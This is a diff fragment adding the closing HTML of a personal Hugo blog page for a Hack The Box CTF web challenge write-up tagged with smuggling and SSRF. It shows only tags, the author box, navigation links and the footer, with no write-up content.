+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ctf/" rel="tag">CTF</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/htb/" rel="tag">HTB</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/challenge/" rel="tag">Challenge</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/web/" rel="tag">Web</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/veasy/" rel="tag">Veasy</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/smuggling/" rel="tag">Smuggling</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/ssrf/" rel="tag">SSRF</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Flavien Jaquerod avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Flavien Jaquerod</span>
+	</div>
+	<div class="authorbox__description">
+		Currently studying a cybersecurity Master&rsquo;s degree at EPFL and ETHZ. Also solving CTF challenges or HTB Machines in my free time!
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/caption/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Caption</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/truesecrets/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">TrueSecrets</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2025 Flavien Jaquerod.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+<script src="/js/custom.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+</body>
+</html>
